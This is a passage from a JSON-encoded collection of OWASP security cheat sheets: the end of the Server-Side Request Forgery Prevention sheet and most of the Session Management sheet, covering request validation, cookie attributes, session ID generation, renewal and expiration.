[n°1](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#case-1-application-can-send-request-only-to-identified-and-trusted-applications), it is assumed that the `IP Address` or `domain name` is required to create the request that will be sent to the *TargetApplication*.\r\n\r\nThe first validation on the input data presented in the case [n°1](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#application-layer) on the 3 types of data will be the same for this case **BUT the second validation will differ**. Indeed, here we must use the block-list approach.\r\n\r\n> **Regarding the proof of legitimacy of the request**: The *TargetedApplication* that will receive the request must generate a random token (ex: alphanumeric of 20 characters) that is expected to be passed by the caller (in body via a parameter for which the name is also defined by the application itself and only allow characters set `[a-z]{1,10}`) to perform a valid request. The receiving endpoint must only accept HTTP POST requests.\r\n\r\n**Validation flow (if one the validation steps fail then the request is rejected):**\r\n\r\n1. The application will receive the IP address or domain name of the *TargetedApplication* and it will apply the first validation on the input data using the libraries/regex mentioned in this [section](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#application-layer).\r\n2. The second validation will be applied against the IP address or domain name of the *TargetedApplication* using the following block-list approach:\r\n   - For IP address:\r\n     - The application will verify that it is a public one (see the hint provided in the next paragraph with the python code sample).\r\n   - For domain name:\r\n        1. The application will verify that it is a public one by trying to resolve the domain name against the DNS resolver that will only resolve internal domain name. Here, it must return a response indicating that it do not know the provided domain because the expected value received must be a public domain.\r\n        2. To prevent the `DNS pinning` attack described in this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf), the application will retrieve all the IP addresses behind the domain name provided (taking records *A* + *AAAA* for IPv4 + IPv6) and it will apply the same verification described in the previous point about IP addresses.\r\n3. The application will receive the protocol to use for the request via a dedicated input parameter for which it will verify the value against an allowed list of protocols (`HTTP` or `HTTPS`).\r\n4. The application will receive the parameter name for the token to pass to the *TargetedApplication* via a dedicated input parameter for which it will only allow the characters set `[a-z]{1,10}`.\r\n5. The application will receive the token itself via a dedicated input parameter for which it will only allow the characters set `[a-zA-Z0-9]{20}`.\r\n6. The application will receive and validate (from a security point of view) any business data needed to perform a valid call.\r\n7. The application will build the HTTP POST request **using only validated information** and will send it (*don't forget to disable the support for [redirection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections) in the web client used*).\r\n\r\n##### Network layer\r\n\r\nSimilar to the following [section](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#network-layer).\r\n\r\n## IMDSv2 in AWS\r\n\r\nIn cloud environments SSRF is often used to access and steal credentials and access tokens from metadata services (e.g. AWS Instance Metadata Service, Azure Instance Metadata Service, GCP metadata server).\r\n\r\n[IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) is an additional defence-in-depth mechanism for AWS that mitigates some of the instances of SSRF.\r\n\r\nTo leverage this protection migrate to IMDSv2 and disable old IMDSv1. Check out [AWS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) for more details.\r\n\r\n## Semgrep Rules\r\n\r\n[Semgrep](https://semgrep.dev/) is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase.\r\nCheckout the Semgrep rule for SSRF to identify/investigate for SSRF vulnerabilities in Java\r\n[https://semgrep.dev/salecharohit:owasp_java_ssrf](https://semgrep.dev/salecharohit:owasp_java_ssrf)\r\n\r\n## References\r\n\r\nOnline version of the [SSRF bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM) (PDF version is used in this cheat sheet).\r\n\r\nArticle about [Bypassing SSRF Protection](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b).\r\n\r\nArticles about SSRF attacks: [Part 1](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a), [part 2](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-2-fun-with-ipv4-addresses-eb51971e476d) and  [part 3](https://medium.com/poka-techblog/server-side-request-forgery-ssrf-part-3-other-advanced-techniques-3f48cbcad27e).\r\n\r\nArticle about [IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)\r\n\r\n## Tools and code used for schemas\r\n\r\n- [Mermaid Online Editor](https://mermaidjs.github.io/mermaid-live-editor) and [Mermaid documentation](https://mermaidjs.github.io/).\r\n- [Draw.io Online Editor](https://www.draw.io/).\r\n\r\nMermaid code for SSRF common flow (printscreen are used to capture PNG image inserted into this cheat sheet):\r\n\r\n```text\r\nsequenceDiagram\r\n    participant Attacker\r\n    participant VulnerableApplication\r\n    participant TargetedApplication\r\n    Attacker->>VulnerableApplication: Crafted HTTP request\r\n    VulnerableApplication->>TargetedApplication: Request (HTTP, FTP...)\r\n    Note left of TargetedApplication: Use payload included<br>into the request to<br>VulnerableApplication\r\n    TargetedApplication->>VulnerableApplication: Response\r\n    VulnerableApplication->>Attacker: Response\r\n    Note left of VulnerableApplication: Include response<br>from the<br>TargetedApplication\r\n```\r\n\r\nDraw.io schema XML code for the \"[case 1 for network layer protection about flows that we want to prevent](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Case1_NetworkLayer_PreventFlow.xml)\" schema (printscreen are used to capture PNG image inserted into this cheat sheet).\r\n"
    },
    {
      "Session_Management_Cheat_Sheet.md": "# Session Management Cheat Sheet\r\n\r\n## Introduction\r\n\r\n**Web Authentication, Session Management, and Access Control**:\r\n\r\nA web session is a sequence of network HTTP request and response transactions associated with the same user. Modern and complex web applications require the retaining of information or status about each user for the duration of multiple requests. Therefore, sessions provide the ability to establish variables – such as access rights and localization settings – which will apply to each and every interaction a user has with the web application for the duration of the session.\r\n\r\nWeb applications can create sessions to keep track of anonymous users after the very first user request. An example would be maintaining the user language preference. Additionally, web applications will make use of sessions once the user has authenticated. This ensures the ability to identify the user on any subsequent requests as well as being able to apply security access controls, authorized access to the user private data, and to increase the usability of the application. Therefore, current web applications can provide session capabilities both pre and post authentication.\r\n\r\nOnce an authenticated session has been established, the session ID (or token) is temporarily equivalent to the strongest authentication method used by the application, such as username and password, passphrases, one-time passwords (OTP), client-based digital certificates, smartcards, or biometrics (such as fingerprint or eye retina). See the OWASP [Authentication Cheat Sheet](Authentication_Cheat_Sheet.md).\r\n\r\nHTTP is a stateless protocol ([RFC2616](https://www.ietf.org/rfc/rfc2616.txt) section 5), where each request and response pair is independent of other web interactions. Therefore, in order to introduce the concept of a session, it is required to implement session management capabilities that link both the authentication and access control (or authorization) modules commonly available in web applications:\r\n\r\n[object Promise]\r\n\r\nThe session ID or token binds the user authentication credentials (in the form of a user session) to the user HTTP traffic and the appropriate access controls enforced by the web application. The complexity of these three components (authentication, session management, and access control) in modern web applications, plus the fact that its implementation and binding resides on the web developer's hands (as web development frameworks do not provide strict relationships between these modules), makes the implementation of a secure session management module very challenging.\r\n\r\nThe disclosure, capture, prediction, brute force, or fixation of the session ID will lead to session hijacking (or sidejacking) attacks, where an attacker is able to fully impersonate a victim user in the web application. Attackers can perform two types of session hijacking attacks, targeted or generic. In a targeted attack, the attacker's goal is to impersonate a specific (or privileged) web application victim user. For generic attacks, the attacker's goal is to impersonate (or get access as) any valid or legitimate user in the web application.\r\n\r\n## Session ID Properties\r\n\r\nIn order to keep the authenticated state and track the users progress within the web application, applications provide users with a **session identifier** (session ID or token) that is assigned at session creation time, and is shared and exchanged by the user and the web application for the duration of the session (it is sent on every HTTP request). The session ID is a `name=value` pair.\r\n\r\nWith the goal of implementing secure session IDs, the generation of identifiers (IDs or tokens) must meet the following properties.\r\n\r\n### Session ID Name Fingerprinting\r\n\r\nThe name used by the session ID should not be extremely descriptive nor offer unnecessary details about the purpose and meaning of the ID.\r\n\r\nThe session ID names used by the most common web application development frameworks [can be easily fingerprinted](https://wiki.owasp.org/index.php/Category:OWASP_Cookies_Database), such as `PHPSESSID` (PHP), `JSESSIONID` (J2EE), `CFID` & `CFTOKEN` (ColdFusion), `ASP.NET_SessionId` (ASP .NET), etc. Therefore, the session ID name can disclose the technologies and programming languages used by the web application.\r\n\r\nIt is recommended to change the default session ID name of the web development framework to a generic name, such as `id`.\r\n\r\n### Session ID Length\r\n\r\nThe session ID must be long enough to prevent brute force attacks, where an attacker can go through the whole range of ID values and verify the existence of valid sessions.\r\n\r\nThe session ID length must be at least `128 bits (16 bytes)`.\r\n\r\n**NOTE**:\r\n\r\n- The session ID length of 128 bits is provided as a reference based on the assumptions made on the next section *Session ID Entropy*. However, this number should not be considered as an absolute minimum value, as other implementation factors might influence its strength.\r\n- For example, there are well-known implementations, such as [Microsoft ASP.NET session IDs](https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionidmanager?redirectedfrom=MSDN&view=netframework-4.7.2): \"*The ASP .NET session identifier is a randomly generated number encoded into a 24-character string consisting of lowercase characters from a to z and numbers from 0 to 5*\".\r\n- It can provide a very good effective entropy, and as a result, can be considered long enough to avoid guessing or brute force attacks.\r\n\r\n### Session ID Entropy\r\n\r\nThe session ID must be unpredictable (random enough) to prevent guessing attacks, where an attacker is able to guess or predict the ID of a valid session through statistical analysis techniques. For this purpose, a good [CSPRNG](https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator) (Cryptographically Secure Pseudorandom Number Generator) must be used.\r\n\r\nThe session ID value must provide at least `64 bits` of entropy (if a good [PRNG](https://en.wikipedia.org/wiki/Pseudorandom_number_generator) is used, this value is estimated to be half the length of the session ID).\r\n\r\nAdditionally, a random session ID is not enough; it must also be unique to avoid duplicated IDs. A random session ID must not already exist in the current session ID space.\r\n\r\n**NOTE**:\r\n\r\n- The session ID entropy is really affected by other external and difficult to measure factors, such as the number of concurrent active sessions the web application commonly has, the absolute session expiration timeout, the amount of session ID guesses per second the attacker can make and the target web application can support, etc.\r\n- If a session ID with an entropy of `64 bits` is used, an attacker can expect to spend more than 292 years to successfully guess a valid session ID, assuming the attacker can try 10,000 guesses per second with 100,000 valid simultaneous sessions available in the web application.\r\n- More information [here](https://owasp.org/www-community/vulnerabilities/Insufficient_Session-ID_Length).\r\n\r\n### Session ID Content (or Value)\r\n\r\nThe session ID content (or value) must be meaningless to prevent information disclosure attacks, where an attacker is able to decode the contents of the ID and extract details of the user, the session, or the inner workings of the web application.\r\n\r\nThe session ID must simply be an identifier on the client side, and its value must never include sensitive information or Personally Identifiable Information (PII). To read more about PII, refer to [Wikipedia](https://en.wikipedia.org/wiki/Personally_identifiable_information) or this [post](https://www.idshield.com/blog/identity-theft/what-pii-and-why-should-i-care/).\r\n\r\nThe meaning and business or application logic associated with the session ID must be stored on the server side, and specifically, in session objects or in a session management database or repository.\r\n\r\nThe stored information can include the client IP address, User-Agent, e-mail, username, user ID, role, privilege level, access rights, language preferences, account ID, current state, last login, session timeouts, and other internal session details. If the session objects and properties contain sensitive information, such as credit card numbers, it is required to duly encrypt and protect the session management repository.\r\n\r\nIt is recommended to use the session ID created by your language or framework. If you need to create your own sessionID, use a cryptographically secure pseudorandom number generator (CSPRNG) with a size of at least 128 bits and ensure that each sessionID is unique.\r\n\r\n## Session Management Implementation\r\n\r\nThe session management implementation defines the exchange mechanism that will be used between the user and the web application to share and continuously exchange the session ID. There are multiple mechanisms available in HTTP to maintain session state within web applications, such as cookies (standard HTTP header), URL parameters (URL rewriting – [RFC2396](https://www.ietf.org/rfc/rfc2396.txt)), URL arguments on GET requests, body arguments on POST requests, such as hidden form fields (HTML forms), or proprietary HTTP headers.\r\n\r\nThe preferred session ID exchange mechanism should allow defining advanced token properties, such as the token expiration date and time, or granular usage constraints. This is one of the reasons why cookies (RFCs [2109](https://www.ietf.org/rfc/rfc2109.txt) & [2965](https://www.ietf.org/rfc/rfc2965.txt) & [6265](https://www.ietf.org/rfc/rfc6265.txt)) are one of the most extensively used session ID exchange mechanisms, offering advanced capabilities not available in other methods.\r\n\r\nThe usage of specific session ID exchange mechanisms, such as those where the ID is included in the URL, might disclose the session ID (in web links and logs, web browser history and bookmarks, the Referer header or search engines), as well as facilitate other attacks, such as the manipulation of the ID or [session fixation attacks](http://www.acrossecurity.com/papers/session_fixation.pdf).\r\n\r\n### Built-in Session Management Implementations\r\n\r\nWeb development frameworks, such as J2EE, ASP .NET, PHP, and others, provide their own session management features and associated implementation. It is recommended to use these built-in frameworks versus building a home made one from scratch, as they are used worldwide on multiple web environments and have been tested by the web application security and development communities over time.\r\n\r\nHowever, be advised that these frameworks have also presented vulnerabilities and weaknesses in the past, so it is always recommended to use the latest version available, that potentially fixes all the well-known vulnerabilities, as well as review and change the default configuration to enhance its security by following the recommendations described along this document.\r\n\r\nThe storage capabilities or repository used by the session management mechanism to temporarily save the session IDs must be secure, protecting the session IDs against local or remote accidental disclosure or unauthorized access.\r\n\r\n### Used vs. Accepted Session ID Exchange Mechanisms\r\n\r\nA web application should make use of cookies for session ID exchange management. If a user submits a session ID through a different exchange mechanism, such as a URL parameter, the web application should avoid accepting it as part of a defensive strategy to stop session fixation.\r\n\r\n**NOTE**:\r\n\r\n- Even if a web application makes use of cookies as its default session ID exchange mechanism, it might accept other exchange mechanisms too.\r\n- It is therefore required to confirm via thorough testing all the different mechanisms currently accepted by the web application when processing and managing session IDs, and limit the accepted session ID tracking mechanisms to just cookies.\r\n- In the past, some web applications used URL parameters, or even switched from cookies to URL parameters (via automatic URL rewriting), if certain conditions are met (for example, the identification of web clients without support for cookies or not accepting cookies due to user privacy concerns).\r\n\r\n### Transport Layer Security\r\n\r\nIn order to protect the session ID exchange from active eavesdropping and passive disclosure in the network traffic, it is essential to use an encrypted HTTPS (TLS) connection for the entire web session, not only for the authentication process where the user credentials are exchanged. This may be mitigated by [HTTP Strict Transport Security (HSTS)](HTTP_Strict_Transport_Security_Cheat_Sheet.md) for a client that supports it.\r\n\r\nAdditionally, the `Secure` [cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies) must be used to ensure the session ID is only exchanged through an encrypted channel. The usage of an encrypted communication channel also protects the session against some session fixation attacks where the attacker is able to intercept and manipulate the web traffic to inject (or fix) the session ID on the victim's web browser (see [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-Slides.pdf) and [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-WP.pdf)).\r\n\r\nThe following set of best practices are focused on protecting the session ID (specifically when cookies are used) and helping with the integration of HTTPS within the web application:\r\n\r\n- Do not switch a given session from HTTP to HTTPS, or vice-versa, as this will disclose the session ID in the clear through the network.\r\n    - When redirecting to HTTPS, ensure that the cookie is set or regenerated **after** the redirect has occurred.\r\n- Do not mix encrypted and unencrypted contents (HTML pages, images, CSS, JavaScript files, etc) in the same page, or from the same domain.\r\n- Where possible, avoid offering public unencrypted contents and private encrypted contents from the same host. Where insecure content is required, consider hosting this on a separate insecure domain.\r\n- Implement [HTTP Strict Transport Security (HSTS)](HTTP_Strict_Transport_Security_Cheat_Sheet.md) to enforce HTTPS connections.\r\n\r\nSee the OWASP [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md) for more general guidance on implementing TLS securely.\r\n\r\nIt is important to emphasize that TLS does not protect against session ID prediction, brute force, client-side tampering or fixation; however, it does provide effective protection against an attacker intercepting or stealing session IDs through a man in the middle attack.\r\n\r\n## Cookies\r\n\r\nThe session ID exchange mechanism based on cookies provides multiple security features in the form of cookie attributes that can be used to protect the exchange of the session ID:\r\n\r\n### Secure Attribute\r\n\r\nThe `Secure` cookie attribute instructs web browsers to only send the cookie through an encrypted HTTPS (SSL/TLS) connection. This session protection mechanism is mandatory to prevent the disclosure of the session ID through MitM (Man-in-the-Middle) attacks. It ensures that an attacker cannot simply capture the session ID from web browser traffic.\r\n\r\nForcing the web application to only use HTTPS for its communication (even when port TCP/80, HTTP, is closed in the web application host) does not protect against session ID disclosure if the `Secure` cookie has not been set - the web browser can be deceived to disclose the session ID over an unencrypted HTTP connection. The attacker can intercept and manipulate the victim user traffic and inject an HTTP unencrypted reference to the web application that will force the web browser to submit the session ID in the clear.\r\n\r\nSee also: [SecureFlag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies)\r\n\r\n### HttpOnly Attribute\r\n\r\nThe `HttpOnly` cookie attribute instructs web browsers not to allow scripts (e.g. JavaScript or VBscript) an ability to access the cookies via the DOM document.cookie object. This session ID protection is mandatory to prevent session ID stealing through XSS attacks. However, if an XSS attack is combined with a CSRF attack, the requests sent to the web application will include the session cookie, as the browser always includes the cookies when sending requests. The `HttpOnly` cookie only protects the confidentiality of the cookie; the attacker cannot use it offline, outside of the context of an XSS attack.\r\n\r\nSee the OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\nSee also: [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies)\r\n\r\n### SameSite Attribute\r\n\r\nSameSite defines a cookie attribute preventing browsers from sending a SameSite flagged cookie with cross-site requests. The main goal is to mitigate the risk of cross-origin information leakage, and provides some protection against cross-site request forgery attacks.\r\n\r\nSee also: [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies)\r\n\r\n### Domain and Path Attributes\r\n\r\nThe [`Domain` cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) instructs web browsers to only send the cookie to the specified domain and all subdomains. If the attribute is not set, by default the cookie will only be sent to the origin server. The [`Path` cookie attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) instructs web browsers to only send the cookie to the specified directory or subdirectories (or paths or resources) within the web application. If the attribute is not set, by default the cookie will only be sent for the directory (or path) of the resource requested and setting the cookie.\r\n\r\nIt is recommended to use a narrow or restricted scope for these two attributes. In this way, the `Domain` attribute should not be set (restricting the cookie just to the origin server) and the `Path` attribute should be set as restrictive as possible to the web application path that makes use of the session ID.\r\n\r\nSetting the `Domain` attribute to a too permissive value, such as `example.com` allows an attacker to launch attacks on the session IDs between different hosts and web applications belonging to the same domain, known as cross-subdomain cookies. For example, vulnerabilities in `www.example.com` might allow an attacker to get access to the session IDs from `secure.example.com`.\r\n\r\nAdditionally, it is recommended not to mix web applications of different security levels on the same domain. Vulnerabilities in one of the web applications would allow an attacker to set the session ID for a different web application on the same domain by using a permissive `Domain` attribute (such as `example.com`) which is a technique that can be used in [session fixation attacks](http://www.acrossecurity.com/papers/session_fixation.pdf).\r\n\r\nAlthough the `Path` attribute allows the isolation of session IDs between different web applications using different paths on the same host, it is highly recommended not to run different web applications (especially from different security levels or scopes) on the same host. Other methods can be used by these applications to access the session IDs, such as the `document.cookie` object. Also, any web application can set cookies for any path on that host.\r\n\r\nCookies are vulnerable to DNS spoofing/hijacking/poisoning attacks, where an attacker can manipulate the DNS resolution to force the web browser to disclose the session ID for a given host or domain.\r\n\r\n### Expire and Max-Age Attributes\r\n\r\nSession management mechanisms based on cookies can make use of two types of cookies, non-persistent (or session) cookies, and persistent cookies. If a cookie presents the [`Max-Age`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) (that has preference over `Expires`) or [`Expires`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) attributes, it will be considered a persistent cookie and will be stored on disk by the web browser based until the expiration time.\r\n\r\nTypically, session management capabilities to track users after authentication make use of non-persistent cookies. This forces the session to disappear from the client if the current web browser instance is closed. Therefore, it is highly recommended to use non-persistent cookies for session management purposes, so that the session ID does not remain on the web client cache for long periods of time, from where an attacker can obtain it.\r\n\r\n- Ensure that sensitive information is not compromised by ensuring that it is not persistent, encrypting it, and storing it only for the duration of the need\r\n- Ensure that unauthorized activities cannot take place via cookie manipulation\r\n- Ensure secure flag is set to prevent accidental transmission over the wire in a non-secure manner\r\n- Determine if all state transitions in the application code properly check for the cookies and enforce their use\r\n- Ensure entire cookie should be encrypted if sensitive data is persisted in the cookie\r\n- Define all cookies being used by the application, their name and why they are needed\r\n\r\n## HTML5 Web Storage API\r\n\r\nThe Web Hypertext Application Technology Working Group (WHATWG) describes the HTML5 Web Storage APIs, `localStorage` and `sessionStorage`, as mechanisms for storing name-value pairs client-side.\r\nUnlike HTTP cookies, the contents of `localStorage` and `sessionStorage` are not automatically shared within requests or responses by the browser and are used for storing data client-side.\r\n\r\n### The localStorage API\r\n\r\n#### Scope\r\n\r\nData stored using the `localStorage` API is accessible by pages which are loaded from the same origin, which is defined as the scheme (`https://`), host (`example.com`), port (`443`) and domain/realm (`example.com`).\r\nThis provides similar access to this data as would be achieved by using the `secure` flag on a cookie, meaning that data stored from `https` could not be retrieved via `http`. Due to potential concurrent access from separate windows/threads, data stored using `localStorage` may be susceptible to shared access issues (such as race-conditions) and should be considered non-locking ([Web Storage API Spec](https://html.spec.whatwg.org/multipage/webstorage.html#the-localstorage-attribute)).\r\n\r\n#### Duration\r\n\r\nData stored using the `localStorage` API is persisted across browsing sessions, extending the timeframe in which it may be accessible to other system users.\r\n\r\n#### Offline Access\r\n\r\nThe standards do not require `localStorage` data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk.\r\n\r\n#### Use Case\r\n\r\nWHATWG suggests the use of `localStorage` for data that needs to be accessed across windows or tabs, across multiple sessions, and where large (multi-megabyte) volumes of data may need to be stored for performance reasons.\r\n\r\n### The sessionStorage API\r\n\r\n#### Scope\r\n\r\nThe `sessionStorage` API stores data within the window context from which it was called, meaning that Tab 1 cannot access data which was stored from Tab 2.\r\nAlso, like the `localStorage` API, data stored using the `sessionStorage` API is accessible by pages which are loaded from the same origin, which is defined as the scheme (`https://`), host (`example.com`), port (`443`) and domain/realm (`example.com`).\r\nThis provides similar access to this data as would be achieved by using the `secure` flag on a cookie, meaning that data stored from `https` could not be retrieved via `http`.\r\n\r\n#### Duration\r\n\r\nThe `sessionStorage` API only stores data for the duration of the current browsing session. Once the tab is closed, that data is no longer retrievable. This does not necessarily prevent access, should a browser tab be reused or left open. Data may also persist in memory until a garbage collection event.\r\n\r\n#### Offline Access\r\n\r\nThe standards do not require `sessionStorage` data to be encrypted-at-rest, meaning it may be possible to directly access this data from disk.\r\n\r\n#### Use Case\r\n\r\nWHATWG suggests the use of `sessionStorage` for data that is relevant for one-instance of a workflow, such as details for a ticket booking, but where multiple workflows could be performed in other tabs concurrently. The window/tab bound nature will keep the data from leaking between workflows in separate tabs.\r\n\r\n### References\r\n\r\n- [Web Storage APIs](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API)\r\n- [LocalStorage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)\r\n- [SessionStorage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)\r\n- [WHATWG Web Storage Spec](https://html.spec.whatwg.org/multipage/webstorage.html#webstorage)\r\n\r\n## Web Workers\r\n\r\nWeb Workers run JavaScript code in a global context separate from the one of the current window. A communication channel with the main execution window exists, which is called `MessageChannel`.\r\n\r\n### Use Case\r\n\r\nWeb Workers are an alternative for browser storage of (session) secrets when storage persistence across page refresh is not a requirement. For Web Workers to provide secure browser storage, any code that requires the secret should exist within the Web Worker and the secret should never be transmitted to the main window context.\r\n\r\nStoring secrets within the memory of a Web Worker offers the same security guarantees as an HttpOnly cookie: the confidentiality of the secret is protected. Still, an XSS attack can be used to send messages to the Web Worker to perform an operation that requires the secret. The Web Worker will return the result of the operation to the main execution thread.\r\n\r\nThe advantage of a Web Worker implementation compared to an HttpOnly cookie is that a Web Worker allows for some isolated JavaScript code to access the secret; an HttpOnly cookie is not accessible to any JavaScript. If the frontend JavaScript code requires access to the secret, the Web Worker implementation is the only browser storage option that preserves the secret confidentiality.\r\n\r\n## Session ID Life Cycle\r\n\r\n### Session ID Generation and Verification: Permissive and Strict Session Management\r\n\r\nThere are two types of session management mechanisms for web applications, permissive and strict, related to session fixation vulnerabilities. The permissive mechanism allows the web application to initially accept any session ID value set by the user as valid, creating a new session for it, while the strict mechanism enforces that the web application will only accept session ID values that have been previously generated by the web application.\r\n\r\nThe session tokens should be handled by the web server if possible or generated via a cryptographically secure random number generator.\r\n\r\nAlthough the most common mechanism in use today is the strict one (more secure), [PHP defaults to permissive](https://wiki.php.net/rfc/session-use-strict-mode). Developers must ensure that the web application does not use a permissive mechanism under certain circumstances. Web applications should never accept a session ID they have never generated, and in case of receiving one, they should generate and offer the user a new valid session ID. Additionally, this scenario should be detected as a suspicious activity and an alert should be generated.\r\n\r\n### Manage Session ID as Any Other User Input\r\n\r\nSession IDs must be considered untrusted, as any other user input processed by the web application, and they must be thoroughly validated and verified. Depending on the session management mechanism used, the session ID will be received in a GET or POST parameter, in the URL or in an HTTP header (e.g. cookies). If web applications do not validate and filter out invalid session ID values before processing them, they can potentially be used to exploit other web vulnerabilities, such as SQL injection if the session IDs are stored on a relational database, or persistent XSS if the session IDs are stored and reflected back afterwards by the web application.\r\n\r\n### Renew the Session ID After Any Privilege Level Change\r\n\r\nThe session ID must be renewed or regenerated by the web application after any privilege level change within the associated user session. The most common scenario where the session ID regeneration is mandatory is during the authentication process, as the privilege level of the user changes from the unauthenticated (or anonymous) state to the authenticated state though in some cases still not yet the authorized state. Common scenarios to consider include; password changes, permission changes, or switching from a regular user role to an administrator role within the web application. For all sensitive pages of the web application, any previous session IDs must be ignored, only the current session ID must be assigned to every new request received for the protected resource, and the old or previous session ID must be destroyed.\r\n\r\nThe most common web development frameworks provide session functions and methods to renew the session ID, such as `request.getSession(true)` & `HttpSession.invalidate()` (J2EE), `Session.Abandon()` & `Response.Cookies.Add(new...)` (ASP .NET), or `session_start()` & `session_regenerate_id(true)` (PHP).\r\n\r\nThe session ID regeneration is mandatory to prevent [session fixation attacks](http://www.acrossecurity.com/papers/session_fixation.pdf), where an attacker sets the session ID on the victim user's web browser instead of gathering the victim's session ID, as in most of the other session-based attacks, and independently of using HTTP or HTTPS. This protection mitigates the impact of other web-based vulnerabilities that can also be used to launch session fixation attacks, such as HTTP response splitting or XSS (see [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-Slides.pdf) and [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-WP.pdf)).\r\n\r\nA complementary recommendation is to use a different session ID or token name (or set of session IDs) pre and post authentication, so that the web application can keep track of anonymous users and authenticated users without the risk of exposing or binding the user session between both states.\r\n\r\n### Considerations When Using Multiple Cookies\r\n\r\nIf the web application uses cookies as the session ID exchange mechanism, and multiple cookies are set for a given session, the web application must verify all cookies (and enforce relationships between them) before allowing access to the user session.\r\n\r\nIt is very common for web applications to set a user cookie pre-authentication over HTTP to keep track of unauthenticated (or anonymous) users. Once the user authenticates in the web application, a new post-authentication secure cookie is set over HTTPS, and a binding between both cookies and the user session is established. If the web application does not verify both cookies for authenticated sessions, an attacker can make use of the pre-authentication unprotected cookie to get access to the authenticated user session (see [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-Slides.pdf) and [here](https://media.blackhat.com/bh-eu-11/Raul_Siles/BlackHat_EU_2011_Siles_SAP_Session-WP.pdf)).\r\n\r\nWeb applications should try to avoid the same cookie name for different paths or domain scopes within the same web application, as this increases the complexity of the solution and potentially introduces scoping issues.\r\n\r\n## Session Expiration\r\n\r\nIn order to minimize the time period an attacker can launch attacks over active sessions and hijack them, it is mandatory to set expiration timeouts for every session, establishing the amount of time a session will remain active. Insufficient session expiration by the web application increases the exposure of other session-based attacks, as for the attacker to be able to reuse a valid session ID and hijack the associated session, it must still be active.\r\n\r\nThe shorter the session interval is, the lesser the time an attacker has to use the valid session ID. The session expiration timeout values must be set accordingly with the purpose and nature of the web application, and balance security and usability, so that the user can comfortably complete the operations within the web application without his session frequently expiring.\r\n\r\nBoth the idle and absolute timeout values are highly dependent on how critical the web application and its data are. Common idle timeouts ranges are 2-5 minutes for high-value applications and 15-30 minutes for low risk applications. Absolute timeouts depend on how long a user usually uses the application. If the application is intended to be used by an office worker for a full day, an appropriate absolute timeout range could be between 4 and 8 hours.\r\n\r\nWhen a session expires, the web application must take active actions to invalidate the session on both sides, client and server. The latter is the most relevant and mandatory from a security perspective.\r\n\r\nFor most session exchange mechanisms, client side actions to invalidate the session ID are based on clearing out the token value. For example, to invalidate a cookie it is recommended to provide an empty (or invalid) value for the session ID, and set the `Expires` (or `Max-Age`) attribute to a date from the past (in case a persistent cookie is being used): `Set-Cookie: id=; Expires=Friday, 17-May-03 18:45:00 GMT`\r\n\r\nIn order to close and invalidate the session on the server side, it is mandatory for the web application to take active actions when the session expires, or the user actively logs out, by using the functions and methods offered by the session management mechanisms, such as `HttpSession.invalidate()` (J2EE), `Session.Abandon()` (ASP .NET) or `session_destroy()/unset()` (PHP).\r\n\r\n### Automatic Session Expiration\r\n\r\n#### Idle Timeout\r\n\r\nAll sessions should implement an idle or inactivity timeout. This timeout defines the amount of time a session will remain active in case there is no activity in the session, closing and invalidating the session upon the defined idle period since the last HTTP request received by the web application for a given session ID.\r\n\r\nThe idle timeout limits the chances an attacker has to guess and use a valid session ID from another user. However, if the attacker is able to hijack a given session, the idle timeout does not limit the attacker's actions, as they can generate activity on the session periodically to keep the session active for longer periods of time.\r\n\r\nSession timeout management and expiration must be enforced server-side. If the client is used to enforce the session timeout, for example using the session token or other client parameters to track time references (e.g. number of minutes since login time), an attacker could manipulate these to extend the session duration.\r\n\r\n#### Absolute Timeout\r\n\r\nAll sessions should implement an absolute timeout, 